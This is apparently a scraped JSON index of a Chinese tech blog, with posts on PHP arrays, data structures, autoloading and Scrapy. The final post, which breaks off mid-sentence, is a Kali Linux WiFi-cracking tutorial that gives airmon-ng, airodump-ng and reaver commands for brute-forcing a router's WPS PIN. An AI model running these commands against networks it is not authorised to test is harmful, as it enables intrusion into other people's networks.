返回单元顺序相反的数组array_column — 返回数组中指定的一列array_combine — 创建一个数组，用一个数组的值作为其键名，另一个数组的值作为其值array_diff — 计算数组的差集array_intersect — 计算数组的交集array_filter — 用回调函数过滤数组中的单元array_flip — 交换数组中的键和值array_keys — 返回数组中部分的或所有的键名array_values — 返回数组中所有的值array_rand — 从数组中随机取出一个或多个单元shuffle — 打乱数组array_product — 计算数组中所有值的乘积array_sum — 对数组中所有值求和array_search — 在数组中搜索给定的值，如果成功则返回首个相应的键名array_key_exists — 检查数组里是否有指定的键名或索引in_array — 检查数组中是否存在某个值array_replace — 使用传递的数组替换第一个数组的元素array_slice — 从数组中取出一段array_splice — 去掉数组中的某一部分并用其它值取代 PHP自带的这些数组函数基本上你所想到的操作它都有，没有的也可以组合这些方法创造一个，我记得在laravel框架里面就自带了一个数组集合类，里面就有一些非常好用的方法。 有人问，这么多函数，怎么能记住？ 其实我觉得大部分时候并不要死记硬背，面试除外，当你遇到问题的时候至少心里有点数，具体参数可以查下文档，或者使用IDE的联想功能，平时没事多看看官方文档也挺好的。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"},{"name":"数组","slug":"数组","permalink":"https://wangbjun.github.io/tags/%E6%95%B0%E7%BB%84/"}]},{"title":"关于Scrapy爬虫数据传递问题","slug":"scrapy-param-pass","date":"2016-01-07T04:08:45.000Z","updated":"2020-01-09T04:37:32.302Z","comments":true,"path":"2016/01/07/scrapy-param-pass/","link":"","permalink":"https://wangbjun.github.io/2016/01/07/scrapy-param-pass/","excerpt":"问题：这两天研究爬虫掉进一个大坑，爬了好久才爬出去，这里说几句，我写的爬图片的爬虫很简单，从一个图片列表进二级图片详情页，然后爬取二级详情页的所有图片，但是有个需求就是需要以二级详情页的标题为目录分类存放图片！思路很简单，就是在item里面增加一个字段title存放标题： 1234class PicscrapyItem(scrapy.Item): image_urls &#x3D; scrapy.Field() # 图片地址 images &#x3D; scrapy.Field() title &#x3D; scrapy.Field() # 图片标题（目录） 然后在pipelines里面获取item里面数据，保存的时候做一下处理： 123456789101112131415class PicscrapyPipeline(ImagesPipeline): item &#x3D; [] def get_media_requests(self, item, info): self.item &#x3D; item return [Request(x) for x in item.get(self.images_urls_field, [])] # 重写函数，修改了下载图片名称的生成规则 def file_path(self, request, response&#x3D;None, info&#x3D;None): if not isinstance(request, Request): url &#x3D; request else: url &#x3D; request.url url &#x3D; urlparse(url) img_name &#x3D; url.path.split(&#39;&#x2F;&#39;)[5].split(&#39;.&#39;)[0] return self.item[&#39;title&#39;] + &#39;&#x2F;%s.jpg&#39; % img_name 上面的代码看上去没毛病，重写了Scrapy框架ImagesPipeline的方法,根据title字段分目录存放，但是当我跑起来的时候看上去也没毛病，但是查看数据的时候却不对了，目录是出来了，但是牛头不对马嘴！","text":"问题：这两天研究爬虫掉进一个大坑，爬了好久才爬出去，这里说几句，我写的爬图片的爬虫很简单，从一个图片列表进二级图片详情页，然后爬取二级详情页的所有图片，但是有个需求就是需要以二级详情页的标题为目录分类存放图片！思路很简单，就是在item里面增加一个字段title存放标题： 1234class PicscrapyItem(scrapy.Item): image_urls &#x3D; scrapy.Field() # 图片地址 images &#x3D; scrapy.Field() title &#x3D; scrapy.Field() # 图片标题（目录） 然后在pipelines里面获取item里面数据，保存的时候做一下处理： 123456789101112131415class PicscrapyPipeline(ImagesPipeline): item &#x3D; [] def get_media_requests(self, item, info): self.item &#x3D; item return [Request(x) for x in item.get(self.images_urls_field, [])] # 重写函数，修改了下载图片名称的生成规则 def file_path(self, request, response&#x3D;None, info&#x3D;None): if not isinstance(request, Request): url &#x3D; request else: url &#x3D; request.url url &#x3D; urlparse(url) img_name &#x3D; url.path.split(&#39;&#x2F;&#39;)[5].split(&#39;.&#39;)[0] return self.item[&#39;title&#39;] + &#39;&#x2F;%s.jpg&#39; % img_name 上面的代码看上去没毛病，重写了Scrapy框架ImagesPipeline的方法,根据title字段分目录存放，但是当我跑起来的时候看上去也没毛病，但是查看数据的时候却不对了，目录是出来了，但是牛头不对马嘴！ 分析：研究了好久我才发现问题就在于多线程，Scrapy框架默认是开启多线程的，在settings里面有个字段可以定义开启的线程数，默认是开启16个线程同时爬取： 12# Configure maximum concurrent requests performed by Scrapy (default: 16)# CONCURRENT_REQUESTS &#x3D; 32 我上面的代码如果是单线程运行没毛病，但是多线程的话，数据是共享的，就会错乱，导致图片保存的位置根本不是我想要的结果，怎么解决呢？ 1. settings在settings里面设置线程数为1，釜底抽薪，不过即使这样设置，偶尔也会出现错乱，这种方法牺牲了爬取效率，不可取 2. meta我之所以采取类共享的方式传递item是因为在file_path函数内部我无法获取到item的值，后来，网上查了好久发现有一种方式可以在函数间安全传递数据，就是request的meta属性，所以正确的做法如下： 12345678910111213class PicscrapyPipeline(ImagesPipeline): def get_media_requests(self, item, info): return [Request(x, meta&#x3D;&#123;&#39;title&#39;: item[&#39;title&#39;]&#125;) for x in item.get(self.images_urls_field, [])] # 重写函数，修改了下载图片名称的生成规则 def file_path(self, request, response&#x3D;None, info&#x3D;None): if not isinstance(request, Request): url &#x3D; request else: url &#x3D; request.url url &#x3D; urlparse(url) img_name &#x3D; url.path.split(&#39;&#x2F;&#39;)[5].split(&#39;.&#39;)[0] return request.meta[&#39;title&#39;] + &#39;&#x2F;%s.jpg&#39; % img_name 然后问题解决，新技能get！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Scrapy","slug":"Scrapy","permalink":"https://wangbjun.github.io/tags/Scrapy/"}]},{"title":"PHP平衡二叉树","slug":"php-btree","date":"2016-01-05T11:00:03.000Z","updated":"2020-01-09T08:08:54.761Z","comments":true,"path":"2016/01/05/php-btree/","link":"","permalink":"https://wangbjun.github.io/2016/01/05/php-btree/","excerpt":"平衡二叉树之前讲过树，二叉树，二叉排序树，现在说说这个平衡二叉树，平衡二叉树是一个平衡的二叉排序树，关键在于平衡，它的意思是其中每一个节点的左子树和右子树的高度差不多都是1。 为什么要平衡呢？还是为了提高查找速度，举个例子有一个数组 [3,2,1,4,5,6,7,10,9,8]，如果按照二叉排序树的算法生成之后应该是图1的结果，这样其实对于查找是不利的，举个例子，如果你要找节点8,你得找7次，但是如果是图2这种结构，则只需要3次。","text":"平衡二叉树之前讲过树，二叉树，二叉排序树，现在说说这个平衡二叉树，平衡二叉树是一个平衡的二叉排序树，关键在于平衡，它的意思是其中每一个节点的左子树和右子树的高度差不多都是1。 为什么要平衡呢？还是为了提高查找速度，举个例子有一个数组 [3,2,1,4,5,6,7,10,9,8]，如果按照二叉排序树的算法生成之后应该是图1的结果，这样其实对于查找是不利的，举个例子，如果你要找节点8,你得找7次，但是如果是图2这种结构，则只需要3次。 下面看一下图： 最后贴一个PHP实现的代码： 树节点类:1234567891011121314151617181920212223class Node&#123; public $key; public $data; public $bf; //平衡因子 public $leftNode; public $rightNode; public function __construct($key, $data) &#123; $this-&gt;key = $key; $this-&gt;data = $data; &#125; public function __toString() &#123; return $this-&gt;key . '---&gt;' . $this-&gt;data; &#125;&#125; 这里涉及到几个算法，比较难理解： 左旋和右旋12345678910111213141516171819202122232425262728293031/** * 对以p为根的二叉排序树作右旋处理 * 处理之后p指向新的树根节点，即旋转处理之前的左子树的树节点 * @param $p Node */public function RRotate(Node &amp;$p)&#123; $l = $p-&gt;leftNode; $p-&gt;leftNode = $l-&gt;rightNode; $l-&gt;rightNode = $p; $p = $l;&#125;/** * 对以p为根的二叉排序树作左旋处理 * 处理之后p指向新的树根节点，即旋转处理之前的右子树的树节点 * @param $p Node */public function LRotate(Node &amp;$p)&#123; $r = $p-&gt;rightNode; $p-&gt;rightNode = $r-&gt;leftNode; $r-&gt;leftNode = $p; $p = $r;&#125; 左平衡旋转和右平衡旋转123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778/** * 左平衡旋转 * @param $root Node */public function leftBalance(Node &amp;$root)&#123; $l = $root-&gt;leftNode; switch ($l-&gt;bf) &#123; case EH: $l-&gt;bf = RH; $root-&gt;bf = LH; self::RRotate($root); break; case LH: $root-&gt;bf = $l-&gt;bf = EH; self::RRotate($root); break; case RH: $lr = $l-&gt;rightNode; switch ($lr-&gt;bf) &#123; case LH: $root-&gt;bf = RH; $l-&gt;bf = EH; break; case EH: $root-&gt;bf = $l-&gt;bf = EH; break; case RH: $root-&gt;bf = EH; $l-&gt;bf = LH; break; &#125; $lr-&gt;bf = EH; self::LRotate($root-&gt;leftNode); self::RRotate($root); &#125;&#125;/** * 右平衡旋转 * @param $root Node */public function rightBalance(Node &amp;$root)&#123; $r = $root-&gt;rightNode; switch ($r-&gt;bf) &#123; case RH: $root-&gt;bf = $r-&gt;bf = EH; self::LRotate($root); break; case EH: $root-&gt;bf = RH; $r-&gt;bf = LH; self::LRotate($root); break; case LH: $rl = $r-&gt;leftNode; switch ($rl-&gt;bf) &#123; case EH: $root-&gt;bf = $r-&gt;bf = EH; break; case RH: $root-&gt;bf = LH; $rl-&gt;bf = EH; break; case LH: $root-&gt;bf = EH; $r-&gt;bf = RH; break; &#125; $rl-&gt;bf = EH; self::RRotate($root-&gt;rightNode); self::LRotate($root); break; &#125;&#125; 最后是插入算法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public function insertAvl(&amp;$root, int $key, string $data, bool &amp;$taller = false)&#123; if (!$root) &#123; $root = new Node($key, $data); $root-&gt;leftNode = $root-&gt;rightNode = null; $root-&gt;bf = EH; $taller = true; return true; &#125; else &#123; if ($key == $root-&gt;key) &#123; $taller = false; return false; &#125; if ($key &lt; $root-&gt;key) &#123; //在左子树中搜索 if (!self::insertAvl($root-&gt;leftNode, $key, $data, $taller)) &#123; return false; &#125; if ($taller) &#123; switch ($root-&gt;bf) &#123; //检查树的平衡度 case LH: self::leftBalance($root); $taller = false; break; case EH: $root-&gt;bf = LH; $taller = true; break; case RH: $root-&gt;bf = EH; $taller = false; break; &#125; &#125; &#125; else &#123; //在右子树中搜索 if (!self::insertAvl($root-&gt;rightNode, $key, $data, $taller)) &#123; return false; &#125; if ($taller) &#123; switch ($root-&gt;bf) &#123; //检查树的平衡度 case LH: $root-&gt;bf = EH; $taller = false; break; case EH: $root-&gt;bf = RH; $taller = true; break; case RH: self::rightBalance($root); $taller = false; break; &#125; &#125; &#125; &#125; return true;&#125;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"PHP类的自动加载机制","slug":"php-autoload","date":"2016-01-05T04:00:00.000Z","updated":"2020-01-08T09:43:32.293Z","comments":true,"path":"2016/01/05/php-autoload/","link":"","permalink":"https://wangbjun.github.io/2016/01/05/php-autoload/","excerpt":"1.手动加载？首先，咱们先想一个问题，为什么需要加载机制？ 理论上讲，你可以把所有PHP代码都写在一个文件里面，早期PHP确实有很多这样的代码，因为那时候还没有面向对象的概念，没有代码分层，一个PHP文件里面一大堆函数，一个功能一个函数这么写就行了。 后来，大家都发现这样写起来太乱，不利于维护和扩展，更重要的是有了面向对象的概念，我们可以把属性和方法封装到类里面，然后需要用到的时候就实例化这个类，这从面向过程转向面向对象。 举个例子，现在在同一个文件夹里面有2个类文件 ClassA.php、ClassB.php，还有一个index.php:","text":"1.手动加载？首先，咱们先想一个问题，为什么需要加载机制？ 理论上讲，你可以把所有PHP代码都写在一个文件里面，早期PHP确实有很多这样的代码，因为那时候还没有面向对象的概念，没有代码分层，一个PHP文件里面一大堆函数，一个功能一个函数这么写就行了。 后来，大家都发现这样写起来太乱，不利于维护和扩展，更重要的是有了面向对象的概念，我们可以把属性和方法封装到类里面，然后需要用到的时候就实例化这个类，这从面向过程转向面向对象。 举个例子，现在在同一个文件夹里面有2个类文件 ClassA.php、ClassB.php，还有一个index.php: 12345678&lt;?php$value = 100;class ClassA&#123; public $name;&#125; 123456&lt;?phpclass ClassB&#123; &#125; 1234&lt;?php$a = new ClassA();var_dump($a); 当你在index.php里面new ClassA 的时候没问题，至少这样写是没有语法错误的，现在IDE都很智能，可以自动提示。但是当你运行index.php的时候就会报错： 1PHP Fatal error: Uncaught Error: Class 'ClassA' not found in /home/jwang/Documents/Work/MyBlog/PHP/Code/index.php:2 有些初学者就会很懵逼，明明这个类就在同一个文件夹下啊，为什么会找不到？ 错误提示翻译过来就是: 在index.php 文件里面没有找到 ClassA！ 其实仔细想想，这个文件里面确实没有ClassA。 解决这个问题的方式就是使用 require 、include 关键字加载所需的类，其实PHP解释器在执行这个文件的时候遇到require或者include处理很简单，它就相当于下面这种写法： 12345678910&lt;?phpclass ClassA&#123; public $name;&#125;$a = new ClassA();var_dump($a); 这时候当然不会报错，其实在MVC的框架里面，PHP执行的自始至终都是index.php这一个文件，只不过框架可以根据路由去加载不同的文件！所谓的加载，其实就是替换，如果没有这种加载机制，那如果你在不同的地方用到同一个类，是不是用到的地方就得copy一份类的代码… 有一点需要注意一下，require或include 不仅仅可以加载文件里面的类，也可以加载文件里面的变量，比如说 ClassA.php 这个文件里面还定义了一个$value = 100, 这时候你就可以在index.php里面直接使用$value了，它的值就是100； 假如说，这时候你在index.php里面也定义了一个$value, 而且值不一样，那就看你在哪里require的，假如你在require之前定义了$value，那就以require文件里面的为准，这就相当于重新赋值了。假如是之后，则以最新当前文件的定义为准！记住PHP代码是顺序执行的就行了 2.自动加载虽然可以使用require，include去加载不同地方的类，但是还是太麻烦了，用到一个就得写一个，忘了就麻烦了，这时候就需要自动加载机制！ 早期的时候可以使用 __autoload() 这个魔术方法去实现自动加载，但是现在一般都是建议使用 spl_autoload_register，当PHP脚本找不到所需的类时候就会自动调用这个函数！ 比如说在上面index.php里面，由于我并没有定义这2个方法的任何一个，所以会报错, 修改一下： 123456789&lt;?phpspl_autoload_register(function ($class) &#123; require $class.\".php\";&#125;);$a = new ClassA();var_dump($a); 可以定义多个spl_autoload_register 从不同的地方加载，而__autoload函数则不能重复定义。 需要注意的是，因为PHP是顺序执行的，这个函数必须在new之前定义，函数参数是一个函数，你也可以传一个匿名函数，只有一个参数，是需要加载的类的名称，由于这里并没有使用命名空间（后面再讲），所以在这里这个 $class 的值就是 ClassA。既然我们都知道类的名称了，我们就可以在这里去require或include所需的文件类。 有一点需要说明一下，按标准来说，一个文件一个类，而且类的名字必须和文件名字一样（至少是有规律的），你要是不按这套路来，那可就没辙了！ 3.命名空间上面的例子里面，虽然解决了自动加载问题，但是依然有一个问题，假如现在多了一个文件夹App，我们把 ClassB 放到 App 文件夹里面，再运行代码，你会发现还是找不到ClassB，require会报错。 有好几种解决方法，你可以在require的时候判断文件是否存在，先在当前文件夹下找，如果不存在就去App文件找，把可能存在的地方都找一遍，如果都找不到就报错！ 但是这种方法效率很低，有一些框架会采用文件命名带上文件夹名的方式解决这些问题，比如说把ClassB.php 改成 App_ClassB.php，这样就可以根据文件名找到文件，带来的后果就是文件夹名字超级长…不是太优雅！ 默认情况下，如果你没有使用命名空间，所有文件都在同一个命名空间下全局(), 使用命名空间来改造上面的代码： ClassA.php: 1234567&lt;?phpnamespace App;class ClassA&#123; public $name;&#125; ClassB.php: 1234567&lt;?phpnamespace App;class ClassB&#123;&#125; 这时候如果想在index.php里面使用ClassB，有两种选择，一种是写上命名空间$a = new \\App\\ClassB(),另一种则是使用user关键字: 12345678910111213&lt;?phpuse App\\ClassA;use App\\ClassB;spl_autoload_register(function ($class) &#123; require $class.\".php\";&#125;);$a = new ClassA();$b = new ClassB();var_dump($a); 但是这时候依然无法正常加载，因为这时候$class的值是 App\\ClassB, 带上了命名空间，为了能正常加载我们需要改造一下自动加载函数： 1234567&lt;?phpdefine(\"APP_PATH\", __DIR__);spl_autoload_register(function ($file) &#123; $file = str_replace('\\\\', '/', trim($file, 'App')); include APP_PATH.'/app'.$file.\".php\";&#125;); 简单的说，只是处理一下目录分隔符和路径！命名空间并不是为了解决自动加载问题，命名空间主要是为了解决类名重复问题，但是有命名空间我们就可以更容易的实现自动加载！ 4.composer自动加载现在很多框架更多的是使用composer实现自动加载，使用一些第三方的类库也更方便，即使我们不使用第三方类库，composer也很好用！基本步骤如下： 第一步，安装composer，这个我就不多说了，如果在Ubuntu下面，可以执行 sudo apt install composer 第二步，在项目根目录执行 composer init 进行初始化操作，当然你可以自己新建一个composer.json 文件,如下： 12345678910&#123; \"name\": \"root/auto-load\", \"authors\": [ &#123; \"name\": \"wangbenjun\", \"email\": \"wangbenjun@gmail.com\" &#125; ], \"require\": &#123;&#125;&#125; 第三步，配置自动加载选项，composer主要有一下2个配置选项用于配置自动加载, 其中dev是用于开发环境： 12345678910111213\"autoload\": &#123; \"classmap\": [ \"lib\" ], \"psr-4\": &#123; \"App\\\\\": \"app/\" &#125; &#125;,\"autoload-dev\": &#123; \"psr-4\": &#123; \"Tests\\\\\": \"tests/\" &#125; &#125;, classmap 是类映射, 用于处理那些没有使用命名空间的类库文件夹，composer使用了一个关联数组给里面所有的文件做了一个映射，便于快速找到所需的类。psr-4 则是处理使用了命名空间的文件夹 修改完了之后执行 composer dumpautoload 就可以生成自动加载文件，可以看到多出一个vendor文件夹，在index.php里面require里面的autoload.php就可以实现自动加载了。 123456789101112131415&lt;?phprequire \"vendor/autoload.php\";use App\\ClassA;use App\\ClassB;$a = new ClassA();$b = new ClassB();$c = new SomeClass();var_dump($a);var_dump($b);var_dump($c); 最终目录结构如下图： 现在大多数Web框架都是采用MVC模式，一般都有一个统一的入口文件，比如index.php, 通常会在这个入口文件定义自动加载机制，使用composer的话只需要include一个autoload.php文件即可！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"PHP数据结构之二叉树","slug":"php-datastruct-btree","date":"2015-12-04T07:35:03.000Z","updated":"2020-01-08T09:43:32.149Z","comments":true,"path":"2015/12/04/php-datastruct-btree/","link":"","permalink":"https://wangbjun.github.io/2015/12/04/php-datastruct-btree/","excerpt":"有一点需要说明，一般讲算法是不会用PHP来实现的，而且实际应用中用PHP来实现也木有多大意思，所以这里用PHP实现的意思在于方便大家熟悉，了解其中概念。 如果要讲二叉树，肯定得先讲讲树，这里也不讲了，只讲一点，二叉树是一种特殊的树，这里为什么说是二叉树而不是三叉树呢？看图 这是典型的树结构图：","text":"有一点需要说明，一般讲算法是不会用PHP来实现的，而且实际应用中用PHP来实现也木有多大意思，所以这里用PHP实现的意思在于方便大家熟悉，了解其中概念。 如果要讲二叉树，肯定得先讲讲树，这里也不讲了，只讲一点，二叉树是一种特殊的树，这里为什么说是二叉树而不是三叉树呢？看图 这是典型的树结构图： 这是典型的二叉树结构图： 区别就在于二叉树每一个树节点最多只有2个子树，但是树就不一定了，可能有一个子树或者多个子树 不过这个和二叉树相关的概念还很多，什么满二叉树，完全二叉树，平衡二叉树，红黑树…这里也不多说了，想要完全消化估计得花时间多看看算法书了，这里就说个最简单的吧！ 这里实现的二叉树其实是二叉排序树, 又称二叉查找树 下面就用PHP来实现一个【二叉排序树】插入，查找，以及遍历操作： 1.插入首先，先定义一个节点，这个节点有4个属性，节点key你可以理解为数组下标，然后是节点数据data，这里面可以存储你想要的数据，然后是一个左节点，一个右节点： 123456789101112131415161718192021class Node&#123; public $key; public $data; public $leftNode; public $rightNode; public function __construct($key, $data) &#123; $this-&gt;key = $key; $this-&gt;data = $data; &#125; public function __toString() &#123; return $this-&gt;key . '---&gt;' . $this-&gt;data; &#125;&#125; 为了方便，节点的所有属性都是public的，可以直接引用, 下面是树的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041class Tree&#123; /** * @var Node */ public $root = null; /** * 插入 * @param $key * @param $data */ public function insert($key, $data) &#123; $node = new Node($key, $data); if ($this-&gt;root == null) &#123; $this-&gt;root = $node; &#125; else &#123; $current = $this-&gt;root; $parent = null; while (true) &#123; $parent = $current; // 如果数字比当前节点小，则存左边 if ($key &lt; $current-&gt;key) &#123; $current = $current-&gt;leftNode; if ($current == null) &#123; $parent-&gt;leftNode = $node; return; &#125; &#125; else &#123; $current = $current-&gt;rightNode; if ($current == null) &#123; $parent-&gt;rightNode = $node; return; &#125; &#125; &#125; &#125; &#125;&#125; 这里定义了一个root用来存放根节点，插入操作可以分为几步： 先初始化这个节点的数据 判断根节点是否为空，如果为空，就把当前节点当作根节点，插入结束 如果根节点不为空，那把根节点当作起始节点开始一个递归遍历过程 如果当前的节点的key大于起始节点，那么就把起始节点的右子节点当作起始节点，同时判断起始节点是否为空，如果为空，则说明已经到头了，插入节点 文字描述的不准确，大家结合代码多理解一下 下面写一些代码测试一下： 12345678910111213$tree = new Tree();$tree-&gt;insert(56, 'AbC');$tree-&gt;insert(16, 'Jack');$tree-&gt;insert(6, 'Baby');$tree-&gt;insert(61, 'Luck');$tree-&gt;insert(180, 'Ketty');$tree-&gt;insert(69, 'LA');$tree-&gt;insert(51, 'Buck');$tree-&gt;insert(47, 'Jun');$tree-&gt;insert(25, 'Hello');$tree-&gt;insert(5, 'Name');$tree-&gt;insert(23, 'Data');$tree-&gt;insert(18, 'Where'); 可以用xdebug查看一下生成的结构是否正确 2.查找二叉树的结构生成了，如果查找呢？查找其实还算简单的，也是从根节点开始递归遍历, 判断根节点的key是否等于需要查找的key，如果不等于判断是大还是获取其子树节点： 12345678910111213141516public function find($key)&#123; $current = $this-&gt;root; while ($key != $current-&gt;key) &#123; if ($key &gt; $current-&gt;key) &#123; $current = $current-&gt;rightNode; &#125; else &#123; $current = $current-&gt;leftNode; &#125; if ($current == null) &#123; return null; &#125; &#125; return $current;&#125; 3.翻转然后再看看翻转二叉树： 123456789101112public function inverse($root)&#123; if ($root == null) &#123; return null; &#125; $tmp = $root-&gt;leftNode; $root-&gt;leftNode = $this-&gt;inverse($root-&gt;rightNode); $root-&gt;rightNode = $this-&gt;inverse($tmp); return $root;&#125; 翻转有很多种算法，我这里只写了一个最简单的递归算法，比较容易理解！ 4.遍历二叉树遍历又分为前序遍历，中序遍历，以及后序遍历，其实没啥区别，区别就在于 echo 那行输出节点的代码位置，这里用的还是递归算法： 123456789101112131415/** * 前序遍历算法 * @param $node */public function preOrderTraverse($node)&#123; if ($node == null) &#123; return; &#125; echo $node-&gt;key . '---&gt;' . $node-&gt;data . \"\\n\"; $this-&gt;preOrderTraverse($node-&gt;leftNode); $this-&gt;preOrderTraverse($node-&gt;rightNode);&#125;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"PHP数据结构之双向链表","slug":"php-double-linklist","date":"2015-12-01T03:01:13.000Z","updated":"2020-01-08T09:43:32.233Z","comments":true,"path":"2015/12/01/php-double-linklist/","link":"","permalink":"https://wangbjun.github.io/2015/12/01/php-double-linklist/","excerpt":"其实这些都是PHP SPL 标准库里面的东西, SPL是用于解决典型问题(standard problems)的一组接口与类的集合。说白了，这是PHP官方实现的一些数据结构,印象中Java的标准库就很强大，不要慌，PHP也有。 按顺序来，先讲一下这个双向链表(double link list)，数据结构讲的是思想，不分编程语言，所以先回顾一下基本概念吧。","text":"其实这些都是PHP SPL 标准库里面的东西, SPL是用于解决典型问题(standard problems)的一组接口与类的集合。说白了，这是PHP官方实现的一些数据结构,印象中Java的标准库就很强大，不要慌，PHP也有。 按顺序来，先讲一下这个双向链表(double link list)，数据结构讲的是思想，不分编程语言，所以先回顾一下基本概念吧。 链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包括两个部分：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域, 相比于线性表顺序结构，操作复杂。 这是百度百科的介绍，不黑不吹，讲的还是非常准确的。我觉得链表最大的特点就是 非连续和非顺序存储，和其对应的就是数组，大家都知道数组在内存里面是连续存储的,由于是连续存储，操作系统在每次分配内存的时候并不一定刚好有那么大小的一块连续的内存，于是就会产生内存碎片。而且数组还有一点不好，想找一个数得从头开始一个个找,其查找时间是O(n),链表是O(1)。总的来说，链表是为了解决数组的不足。 有一点需要说一下，PHP的数组并不是传统意义的数组，在C和Go等语言里面，数组是一个固定大小，固定类型的数据集合，但是PHP的数组啥都干,其功能应该是集了数组，切片，链表，map等数据结构的综合体,在很多其它编程语言里面，这些数据结构是分的非常清楚。所以有时候理解这些概念的时候，不要拿PHP的数组对号入座哈。 借2张图理解一下： 举个形象的例子，这个链表就有点像链条，每一个链条单元是首尾相接，自行车链条就是环型链表，而数组就是铁轨，直的，虽然跑的快, 但是要求高！ 如果用PHP去实现链表倒是不难，毕竟PHP这么强大，可以用数组模拟，但是性能并不高，这里就看一下官方的实现吧： 可以看到这个类实现了Iterator，arrayAccess等接口，就意味着可以像数组一样访问这个对象，有push,pop,shift,unshift,current等方法。 举个例子： 12345678910111213141516171819202122232425262728293031&lt;?php$dll = new SplDoublyLinkedList();$dll-&gt;add(0, 'a');$dll-&gt;add(1, 'b');$dll-&gt;add(2, 'c');$dll-&gt;add(3, 'd');$dll-&gt;add(4, 'e');var_dump($dll);var_dump($dll-&gt;pop()); # 右边出列var_dump($dll-&gt;shift()); # 左边出列var_dump($dll-&gt;bottom()); # 第一个节点var_dump($dll-&gt;top()); # 最后一个节点$dll-&gt;unshift('b'); # 左边入列$dll-&gt;push('d'); # 右边入列//数组遍历foreach ($dll as $value) &#123; var_dump($value);&#125;$dll-&gt;push('f');$dll-&gt;setIteratorMode(SplDoublyLinkedList::IT_MODE_FIFO); # FIFO first insert first out//循环遍历for ($dll-&gt;rewind(); $dll-&gt;valid(); $dll-&gt;next()) &#123; var_dump($dll-&gt;current()) . \"\\n\";&#125; 这里还有一个 setIteratorMode 函数用于设置迭代器模式，它有4种模式，LIFO，FIFO，DELETE，KEEP。LIFO,是last in first out，即后进先出,这种模式其实就是栈模式，栈是一种很常见的数据结构，最广泛的用途莫过于函数调用栈了。FIFO是队列模式，先进先出。DELETE是删除模式，KEEP是遍历模式，默认是FIFO模式。 可见PHP这个双向链表还可以当栈和队列使用，没错！其实后面的 SplStack 和 SplQueue 就是继承的 SplDoublyLinkedList，完全一模一样，就是改个名字而已！ 最后谈谈应用，由于PHP用来写web应用，每个请求完了就销毁了，很多设计模式和数据结构基本上很难用到，除非拿来写一些常驻后台应用。比如说队列，一般都是用redis队列，或者rabbitmq等专业软件实现。但是你如果问可以用PHP来实现一个队列服务常驻后台吗？那是肯定可以的，但是意义不大,PHP的运行效率和C等静态语言那比是差了10万八千里…so,多了解了解一些也是不错的，虽然不一定用得上","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"Kali系统下WiFi密码破解","slug":"kali-wifi-password","date":"2015-11-01T03:01:00.000Z","updated":"2020-01-08T10:07:47.973Z","comments":true,"path":"2015/11/01/kali-wifi-password/","link":"","permalink":"https://wangbjun.github.io/2015/11/01/kali-wifi-password/","excerpt":"在网络渗透中,能够接入被攻击者的网络至关重要,只要黑客接入你的网络,利用DNS欺骗,arp攻击等各种钓鱼技术,基本上就能获取一切信息,WIFI网络的安全性重要性不言而喻! 手机上有很多类似360免费WIFI和WIFI万能钥匙的软件,可以”破解”WIFI密码,实际上这类软件不是”破解”而是”偷”密码,这类软件在安装的时候会自动上传你家的WIFI密码,也有可能是你一不小心分享出去的!分享之后别人使用软件就能连上你家的WIFI了,一般来说,商家WIFI比较多。","text":"在网络渗透中,能够接入被攻击者的网络至关重要,只要黑客接入你的网络,利用DNS欺骗,arp攻击等各种钓鱼技术,基本上就能获取一切信息,WIFI网络的安全性重要性不言而喻! 手机上有很多类似360免费WIFI和WIFI万能钥匙的软件,可以”破解”WIFI密码,实际上这类软件不是”破解”而是”偷”密码,这类软件在安装的时候会自动上传你家的WIFI密码,也有可能是你一不小心分享出去的!分享之后别人使用软件就能连上你家的WIFI了,一般来说,商家WIFI比较多。 常见的WIFI破解技术有2种:攻击测试环境:kali linux 64位,可以安装双系统,如果用虚拟机的话必须要用外置USB网卡! 1.PIN该技术主要利用路由器的wps功能的bug,PIN 码分前4 和后4，先破前4 只有最多一万个组合，破后4 中的前3 只有一千个组合，一共就是一万一千个密码组合。 10 的4 次方+10 的3 次方=11000 个密码组合。当reaver 确定前4 位PIN 密码后，其任务进度数值将直接跳跃至90.9%以上，也就是说只剩余一千个密码组合了。总共一万一千个密码! 主要攻击工具:reaver,该工具十分强大,有很多配置参数,这里只列出最简单的攻击步骤,仅供参考: 12341.airmon-ng start wlan0 #启动网卡的监听模式2.airodump-ng wlan0mon #查看周围区域所有WIFI信号情况3.reaver -i wlan0mon -b AP_MAC -vv #开始pin4.reaver -i wlan0mon -b AP_Mac -p WPS_PIN #得到pin值获取密码 其实现在很多路由器都关闭了wps功能,所以没法pin,而且很多新的路由器都是防pin! 2.暴力穷尽破解该技术理论上只要计算机计算能力够强大,没有什么密码破解不了!只是时间长短的问题.先抓握手包然后跑包! 主要工具: 